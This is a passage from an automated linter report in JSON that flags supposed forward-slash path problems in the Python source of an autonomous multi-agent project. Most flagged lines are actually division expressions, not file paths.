        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 938: Forward slash in path - ': cutoff_time.isoformat()\n                    },\n                    participating_agents=list(improvements.keys()),\n                    performance_improvement=avg_improvement,\n                    confidence_score=min(1.0, len(improvements) / len(agents)),\n                    reproducibility_evidence=[{\n                        '",
        "timestamp": "2025-09-05T17:30:42.269478"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1053: Forward slash in path - \")\n            self.success_rate = successful_experiments / len(self.experiment_history)\n    \n    async def _design_cultivation_experiment(self,\n                                           capability: EmergentCapability,\n                                           test_agents: List[BaseAgent]) -> InnovationExperiment:\n        \"",
        "timestamp": "2025-09-05T17:30:42.269570"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1076: Forward slash in path - ': len(test_agents) // 2,\n            '",
        "timestamp": "2025-09-05T17:30:42.269615"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1077: Forward slash in path - ': len(test_agents) - (len(test_agents) // 2)\n        }\n        \n        # Expected outcomes\n        expected_outcomes = [\n            f\"",
        "timestamp": "2025-09-05T17:30:42.269651"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1133: Forward slash in path - '] / max(0.01, control_results['",
        "timestamp": "2025-09-05T17:30:42.269712"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1191: Forward slash in path - ']) / len(agent_results)\n            })\n        \n        # Calculate group metrics\n        overall_success_rate = sum(r['",
        "timestamp": "2025-09-05T17:30:42.269779"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1195: Forward slash in path - '] for r in results) / len(results)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.269817"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1512: Forward slash in path - ': deployed_capabilities / total_capabilities if total_capabilities > 0 else 0.0,\n            '",
        "timestamp": "2025-09-05T17:30:42.270031"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1567: Forward slash in path - \"\n        )\n        \n        self.cultivation_success_rate = cultivated_count / total_capabilities\n        self.deployment_rate = deployed_count / total_capabilities\n        \n        # Distribution analysis\n        novelty_scores = [cap.novelty_score for cap in self.discovered_capabilities.values()]\n        emergence_types = [cap.emergence_type.value for cap in self.discovered_capabilities.values()]\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.270113"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1582: Forward slash in path - ': sum(novelty_scores) / len(novelty_scores) if novelty_scores else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.270163"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 1637: Forward slash in path - 's behavior/code\n            # 2. Update agent'",
        "timestamp": "2025-09-05T17:30:42.270245"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 245: Forward slash in path - \")\n                continue\n        \n        # Update capability discovery rate\n        self.capability_discovery_rate = len(discovered_capabilities) / max(1, len(capability_candidates))\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.270823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 315: Forward slash in path - \")\n                continue\n        \n        # Update modification success rate\n        if improvement_opportunities:\n            self.modification_success_rate = len(modifications_applied) / len(improvement_opportunities)\n        \n        result = {\n            \"",
        "timestamp": "2025-09-05T17:30:42.270879"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 419: Forward slash in path - ': len(breakthrough_behaviors) / max(1, len(self.agents)),\n            '",
        "timestamp": "2025-09-05T17:30:42.270948"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 420: Forward slash in path - ']) / max(1, len(cultivation_results)),\n            '",
        "timestamp": "2025-09-05T17:30:42.270962"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 490: Forward slash in path - \"\n        complexity_factors = [\n            len(task.description.split()) / 50.0,  # Description length\n            len(task.requirements) / 10.0,        # Number of requirements\n            len(task.dependencies) / 5.0,         # Number of dependencies\n        ]\n        \n        return min(1.0, sum(complexity_factors) / len(complexity_factors))\n    \n    def _estimate_resource_requirements(self, task: Task) -> Dict[str, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.271021"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 527: Forward slash in path - ':\n                    success_rates.append(0.0)\n            \n            if success_rates:\n                return sum(success_rates) / len(success_rates)\n        \n        # Default prediction based on agent capabilities\n        return 0.7  # Conservative estimate\n    \n    def _calculate_task_similarity(self, task1: Task, task2: Task) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.271055"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 537: Forward slash in path - \"\n        # Simple similarity based on description overlap\n        words1 = set(task1.description.lower().split())\n        words2 = set(task2.description.lower().split())\n        \n        if not words1 or not words2:\n            return 0.0\n        \n        intersection = len(words1 & words2)\n        union = len(words1 | words2)\n        \n        return intersection / union if union > 0 else 0.0\n    \n    async def _identify_optimal_agents(self, task: Task) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.271076"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 631: Forward slash in path - \"\n        if len(self.performance_history) < 10:\n            return 0.0\n        \n        recent_performance = list(self.performance_history)[-10:]\n        older_performance = list(self.performance_history)[-20:-10] if len(self.performance_history) >= 20 else []\n        \n        if not older_performance:\n            return 0.0\n        \n        recent_avg = statistics.mean(recent_performance)\n        older_avg = statistics.mean(older_performance)\n        \n        return (recent_avg - older_avg) / max(older_avg, 0.01)\n    \n    def _calculate_performance_improvement_sync(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.271151"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 647: Forward slash in path - \"\n        if len(self.performance_history) < 10:\n            return 0.0\n        \n        recent_performance = list(self.performance_history)[-10:]\n        older_performance = list(self.performance_history)[-20:-10] if len(self.performance_history) >= 20 else []\n        \n        if not older_performance:\n            return 0.0\n        \n        recent_avg = statistics.mean(recent_performance)\n        older_avg = statistics.mean(older_performance)\n        \n        return (recent_avg - older_avg) / max(older_avg, 0.01)\n    \n    # Implementation of missing helper methods\n    \n    async def _get_safe_fallback_pattern(self, task: Task):\n        \"",
        "timestamp": "2025-09-05T17:30:42.271180"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 697: Forward slash in path - '):\n            performance_score *= result.confidence_score\n        \n        self.performance_history.append(performance_score)\n        \n        # Update success rate\n        if self.autonomous_decisions:\n            successful_decisions = sum(1 for d in self.autonomous_decisions if d.success)\n            self.autonomous_success_rate = successful_decisions / len(self.autonomous_decisions)\n    \n    async def _update_autonomous_learning(self, task: Task, decision, result, success: bool):\n        \"",
        "timestamp": "2025-09-05T17:30:42.271224"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 744: Forward slash in path - ']) / max(1, len(self.agents)),\n            '",
        "timestamp": "2025-09-05T17:30:42.271264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 745: Forward slash in path - ': self.task_queue.qsize() / 100.0,  # Assume max 100 tasks\n            '",
        "timestamp": "2025-09-05T17:30:42.271285"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 759: Forward slash in path - \"\n        if len(self.performance_history) < 10:\n            return 0.0\n        \n        recent = list(self.performance_history)[-5:]\n        older = list(self.performance_history)[-10:-5]\n        \n        recent_avg = statistics.mean(recent)\n        older_avg = statistics.mean(older)\n        \n        return (recent_avg - older_avg) / max(older_avg, 0.01)\n    \n    async def _apply_resource_allocation(self, allocation: Dict[str, float]):\n        \"",
        "timestamp": "2025-09-05T17:30:42.271317"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "warning": "Line 774: Forward slash in path - ', 0.0)\n        \n        # In a real implementation, this would adjust:\n        # - Agent assignment priorities\n        # - CPU/memory allocations\n        # - Task scheduling weights\n        # - Background process priorities\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.271344"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Line 55: Forward slash in path - '<script[^>]*>.*?</script>'",
        "timestamp": "2025-09-05T17:30:42.271869"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Line 83: Forward slash in path - '/'",
        "timestamp": "2025-09-05T17:30:42.271890"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Line 271: Forward slash in path - \"\n        violations = []\n        \n        try:\n            tree = ast.parse(code)\n            \n            # Check for dangerous operations\n            for node in ast.walk(tree):\n                # Check for exec/eval\n                if isinstance(node, ast.Name) and node.id in ['",
        "timestamp": "2025-09-05T17:30:42.272053"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Line 571: Forward slash in path - \"\n    \n    def __init__(self, backup_directory: Optional[Path] = None):\n        self.backup_directory = backup_directory or Path(tempfile.gettempdir()) / \"",
        "timestamp": "2025-09-05T17:30:42.272238"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\safety.py",
        "warning": "Line 584: Forward slash in path - \")\n        \n        backup_path = self.backup_directory / f\"",
        "timestamp": "2025-09-05T17:30:42.272261"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 400: Forward slash in path - \"\n    recent_obs = self.memory.episodic_memory[-window:] if len(self.memory.episodic_memory) >= window else self.memory.episodic_memory\n    strategy_obs = [obs for obs in recent_obs if obs.action.action_type == strategy]\n    \n    if strategy_obs:\n        successes = sum(1 for obs in strategy_obs if obs.success)\n        return successes / len(strategy_obs)\n    return None\n'",
        "timestamp": "2025-09-05T17:30:42.273053"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 542: Forward slash in path - \"\n        success_count = sum(1 for obs in observations if obs.success)\n        success_rate = success_count / len(observations)\n        \n        # Calculate average execution time if available\n        execution_times = [\n            obs.action.execution_time for obs in observations \n            if hasattr(obs.action, '",
        "timestamp": "2025-09-05T17:30:42.273139"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 549: Forward slash in path - ')\n        ]\n        avg_execution_time = sum(execution_times) / len(execution_times) if execution_times else 0.0\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.273156"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 674: Forward slash in path - ': total_estimated_hours / 24,\n            '",
        "timestamp": "2025-09-05T17:30:42.273243"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 766: Forward slash in path - ']) / efficiency['",
        "timestamp": "2025-09-05T17:30:42.273326"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 820: Forward slash in path - '):\n            # Group observations by task type\n            task_groups = {}\n            for obs in agent.memory.episodic_memory:\n                task_type = self._classify_task_type(obs.action)\n                if task_type not in task_groups:\n                    task_groups[task_type] = []\n                task_groups[task_type].append(obs)\n            \n            # Calculate performance metrics for each type\n            for task_type, observations in task_groups.items():\n                if len(observations) >= 3:  # Minimum sample size\n                    success_count = sum(1 for obs in observations if obs.success)\n                    success_rate = success_count / len(observations)\n                    \n                    # Calculate average execution time if available\n                    execution_times = []\n                    for obs in observations:\n                        if hasattr(obs.action, '",
        "timestamp": "2025-09-05T17:30:42.273390"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 838: Forward slash in path - '):\n                            execution_times.append(obs.action.execution_time)\n                    \n                    avg_execution_time = sum(execution_times) / len(execution_times) if execution_times else 0\n                    \n                    task_performance[task_type] = {\n                        '",
        "timestamp": "2025-09-05T17:30:42.273414"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1072: Forward slash in path - ') and agent.memory.episodic_memory:\n            recent_episodes = agent.memory.episodic_memory[-20:] if len(agent.memory.episodic_memory) >= 20 else agent.memory.episodic_memory\n            successful_recalls = sum(1 for ep in recent_episodes if ep.success)\n            return successful_recalls / len(recent_episodes)\n        return 0.5\n    \n    async def _calculate_learning_rate(self, agent: BaseAgent) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.273566"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1080: Forward slash in path - ') and agent.learning_system.strategies:\n            strategy_improvements = []\n            for strategy, performance in agent.learning_system.strategies.items():\n                if performance > 0.1:  # Only consider strategies with some data\n                    strategy_improvements.append(min(1.0, performance))\n            return sum(strategy_improvements) / len(strategy_improvements) if strategy_improvements else 0.1\n        return 0.1\n    \n    async def _calculate_tool_efficiency(self, agent: BaseAgent) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.273601"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1097: Forward slash in path - ']) / len(recent_performance)\n                    avg_execution_time = sum(p['",
        "timestamp": "2025-09-05T17:30:42.273634"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1098: Forward slash in path - '] for p in recent_performance) / len(recent_performance)\n                    \n                    # Efficiency score combines success rate and speed\n                    efficiency = avg_success_rate * (1.0 / max(0.1, avg_execution_time))\n                    total_efficiency += efficiency\n                    tool_count += 1\n            \n            return total_efficiency / tool_count if tool_count > 0 else 0.5\n        return 0.5\n    \n    def _calculate_improvement(self, before: Dict[str, float], after: Dict[str, float]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.273667"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1109: Forward slash in path - \"\n        improvements = []\n        for metric, before_value in before.items():\n            if metric in after and before_value > 0:\n                improvement = (after[metric] - before_value) / before_value\n                improvements.append(improvement)\n        return sum(improvements) / len(improvements) if improvements else 0.0\n    \n    async def _create_backup(self, agent: BaseAgent) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.273699"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1300: Forward slash in path - \")\n        \n        # Update success rate\n        if results:\n            successful_modifications = sum(1 for r in results if r.success)\n            self.modification_manager.modification_success_rate = successful_modifications / len(results)\n        \n        return results\n    \n    def _create_improvement_result(self, \n                                 performance_gaps: List[Dict[str, Any]],\n                                 evolution_plan: Dict[str, Any],\n                                 modification_results: List[ModificationResult]) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.273843"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "warning": "Line 1414: Forward slash in path - ': total_estimated_hours / 24,\n            '",
        "timestamp": "2025-09-05T17:30:42.273941"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\advanced_orchestrator.py",
        "warning": "Line 235: Forward slash in path - \":\n            # Balance confidence and cost\n            def value_score(r):\n                return r.confidence_score / max(0.01, r.cost_estimate)\n            return max(results, key=value_score)\n        \n        elif criteria == \"",
        "timestamp": "2025-09-05T17:30:42.274597"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\advanced_orchestrator.py",
        "warning": "Line 296: Forward slash in path - \"Swarm iteration {iteration + 1}/{max_iterations}\"",
        "timestamp": "2025-09-05T17:30:42.274635"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\advanced_orchestrator.py",
        "warning": "Line 402: Forward slash in path - '):\n                task_performance = defaultdict(list)\n                \n                for observation in agent.memory.episodic_memory:\n                    task_type = self._classify_task_type(observation.action)\n                    task_performance[task_type].append(observation.success)\n                \n                # Calculate specialization scores\n                for task_type, successes in task_performance.items():\n                    if len(successes) >= 3:  # Minimum sample size\n                        success_rate = sum(successes) / len(successes)\n                        sample_size = len(successes)\n                        \n                        # Weight by sample size and success rate\n                        specialization_score = success_rate * min(1.0, sample_size / 10.0)\n                        agent_specialization[task_type] = specialization_score\n            \n            # Update specialization matrix\n            self.specialization_matrix[agent_name] = agent_specialization\n            specializations[agent_name] = agent_specialization\n        \n        # Detect emergent roles\n        emergent_roles = await self._identify_emergent_roles(specializations)\n        \n        # Detect collaboration patterns\n        collaboration_patterns = await self._analyze_collaboration_patterns()\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.274710"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\advanced_orchestrator.py",
        "warning": "Line 563: Forward slash in path - ']\n                found_fields = sum(1 for field in required_fields if field in result)\n                score += (found_fields / len(required_fields)) * 0.3\n        \n        return min(1.0, score)\n    \n    async def _calculate_result_similarity(self, result1: Any, result2: Any) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.274805"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\advanced_orchestrator.py",
        "warning": "Line 570: Forward slash in path - \"\n        if type(result1) != type(result2):\n            return 0.0\n        \n        if isinstance(result1, dict) and isinstance(result2, dict):\n            common_keys = set(result1.keys()) & set(result2.keys())\n            if not common_keys:\n                return 0.0\n            \n            similarity_sum = 0.0\n            for key in common_keys:\n                if result1[key] == result2[key]:\n                    similarity_sum += 1.0\n                elif isinstance(result1[key], str) and isinstance(result2[key], str):\n                    # Simple string similarity\n                    if result1[key].lower() in result2[key].lower() or result2[key].lower() in result1[key].lower():\n                        similarity_sum += 0.5\n            \n            return similarity_sum / len(common_keys)\n        \n        elif str(result1) == str(result2):\n            return 1.0\n        \n        return 0.0\n    \n    def _classify_task_type(self, action: Action) -> str:\n        \"",
        "timestamp": "2025-09-05T17:30:42.274830"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\behavior_analytics.py",
        "warning": "Line 1: Forward slash in path - \"\nBehavior Analytics for Emergent Pattern Detection\nAdvanced implementation of pattern recognition, behavioral analysis, and innovation tracking\nBuilt for Windows development environment with async/await patterns\n\"",
        "timestamp": "2025-09-05T17:30:42.275140"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\behavior_analytics.py",
        "warning": "Line 138: Forward slash in path - ': {}\\n        }\\n        \\n        self.continuous_monitoring = True\\n        start_time = datetime.now()\\n        end_time = start_time + timedelta(hours=monitoring_duration_hours)\\n        \\n        try:\\n            while datetime.now() < end_time and self.continuous_monitoring:\\n                analysis_start = datetime.now()\\n                \\n                # Perform behavior analysis\\n                current_analysis = await self._comprehensive_behavior_analysis()\\n                \\n                # Detect new patterns\\n                new_behaviors = await self._detect_emergent_behaviors(\\n                    since_last_analysis=True\\n                )\\n                \\n                # Identify innovations\\n                new_innovations = await self._detect_innovation_events(\\n                    time_window_hours=analysis_interval_minutes/60\\n                )\\n                \\n                # Update interaction networks\\n                await self._update_interaction_networks()\\n                \\n                # Analyze pattern evolution\\n                pattern_evolutions = await self._analyze_pattern_evolution()\\n                \\n                # Record analysis results\\n                analysis_record = {\\n                    '",
        "timestamp": "2025-09-05T17:30:42.275225"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\behavior_analytics.py",
        "warning": "Line 138: Forward slash in path - \"\\n        health_factors = []\\n        \\n        # Detection activity (recent behavior detection)\\n        if self.detected_behaviors:\\n            recent_detections = len([b for b in self.detected_behaviors \\n                                   if (datetime.now() - b.emergence_time).days < 7])\\n            detection_activity = min(1.0, recent_detections / 5.0)  # Expect some weekly activity\\n            health_factors.append(detection_activity)\\n        \\n        # Network connectivity (well-connected interaction network)\\n        if self.interaction_network.number_of_nodes() > 1:\\n            try:\\n                connectivity = nx.average_clustering(self.interaction_network)\\n                health_factors.append(connectivity)\\n            except:\\n                health_factors.append(0.5)  # Default if calculation fails\\n        \\n        # Pattern diversity (various types of behaviors detected)\\n        behavior_types = set(b.behavior_type for b in self.detected_behaviors)\\n        if behavior_types:\\n            diversity_score = len(behavior_types) / len(BehaviorType)\\n            health_factors.append(diversity_score)\\n        \\n        # Innovation rate (recent innovations detected)\\n        if self.innovation_events:\\n            recent_innovations = len([i for i in self.innovation_events \\n                                    if (datetime.now() - i.timestamp).days < 14])\\n            innovation_rate = min(1.0, recent_innovations / 3.0)  # Expect some innovations\\n            health_factors.append(innovation_rate)\\n        \\n        return np.mean(health_factors) if health_factors else 0.5\\n\\n\\n# Additional implementations for network analysis, innovation detection, etc.\\n# would continue here with the same comprehensive approach...\"",
        "timestamp": "2025-09-05T17:30:42.275521"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\competitive_system.py",
        "warning": "Line 1: Forward slash in path - \"\nCompetitive Agent Selection System\nAdvanced implementation of agent tournaments, performance ranking, and competitive optimization\nBuilt for Windows development environment with async/await patterns\n\"",
        "timestamp": "2025-09-05T17:30:42.275786"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\competitive_system.py",
        "warning": "Line 346: Forward slash in path - \"Genetic algorithm generation {generation + 1}/{generations}\"",
        "timestamp": "2025-09-05T17:30:42.275956"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\competitive_system.py",
        "warning": "Line 370: Forward slash in path - ': await self._calculate_population_diversity(population)\n            }\n            evolution_history.append(generation_stats)\n            \n            # Selection for reproduction\n            selected_parents = await self._genetic_selection(population, fitness_scores)\n            \n            # Create next generation\n            new_population = []\n            \n            # Elitism - keep best individuals\n            elite_count = max(2, population_size // 10)\n            elite_indices = np.argsort(fitness_scores)[-elite_count:]\n            for idx in elite_indices:\n                new_population.append(population[idx].copy())\n            \n            # Crossover and mutation\n            while len(new_population) < population_size:\n                parent1, parent2 = np.random.choice(selected_parents, 2, replace=False)\n                child = await self._genetic_crossover(parent1, parent2)\n                child = await self._genetic_mutation(child, generation / generations)\n                new_population.append(child)\n            \n            population = new_population\n            \n            # Early stopping if converged\n            if generation_stats['",
        "timestamp": "2025-09-05T17:30:42.275984"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\competitive_system.py",
        "warning": "Line 467: Forward slash in path - \"\n        if not self.agents:\n            return []\n        \n        # Analyze task to determine suitable agents\n        task_category = await self._categorize_task(task_description)\n        \n        # Get agents with relevant experience\n        suitable_agents = []\n        for agent_name, agent in self.agents.items():\n            profile = self.performance_profiles.get(agent_name)\n            if profile:\n                # Check specialization match\n                specialization_score = profile.specialization_scores.get(task_category, 0.0)\n                overall_performance = profile.wins / max(1, profile.total_competitions)\n                \n                suitability_score = (specialization_score * 0.7) + (overall_performance * 0.3)\n            else:\n                # New agent - give it a chance\n                suitability_score = 0.5\n            \n            suitable_agents.append((agent_name, suitability_score))\n        \n        # Sort by suitability and select top candidates\n        suitable_agents.sort(key=lambda x: x[1], reverse=True)\n        \n        # Tournament size based on competition type\n        if competition_type == CompetitionType.BATTLE_ROYALE:\n            max_participants = min(16, len(suitable_agents))\n        elif competition_type == CompetitionType.ROUND_ROBIN:\n            max_participants = min(8, len(suitable_agents))  # Round robin gets expensive\n        else:\n            max_participants = min(12, len(suitable_agents))\n        \n        return [name for name, _ in suitable_agents[:max_participants]]\n    \n    async def _generate_tournament_brackets(self, tournament: AgentTournament):\n        \"",
        "timestamp": "2025-09-05T17:30:42.276052"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\competitive_system.py",
        "warning": "Line 680: Forward slash in path - ': profile.wins / max(1, profile.total_competitions),\n                    '",
        "timestamp": "2025-09-05T17:30:42.276157"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\competitive_system.py",
        "warning": "Line 691: Forward slash in path - \"\n        health_factors = []\n        \n        # Agent participation rate\n        if self.agents:\n            participating_agents = len([p for p in self.performance_profiles.values() if p.total_competitions > 0])\n            participation_rate = participating_agents / len(self.agents)\n            health_factors.append(participation_rate)\n        \n        # Competition frequency\n        if self.competition_history:\n            recent_competitions = len([c for c in self.competition_history \n                                     if (datetime.now() - c['",
        "timestamp": "2025-09-05T17:30:42.276187"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Line 1: Forward slash in path - \"\nIntegration Layer for Advanced Coordination System\nSeamless integration with existing systems, backward compatibility, and performance monitoring\nBuilt for Windows development environment with async/await patterns\n\"",
        "timestamp": "2025-09-05T17:30:42.276469"
      },
      {
        "category": "WINDOWS_COMPAT",
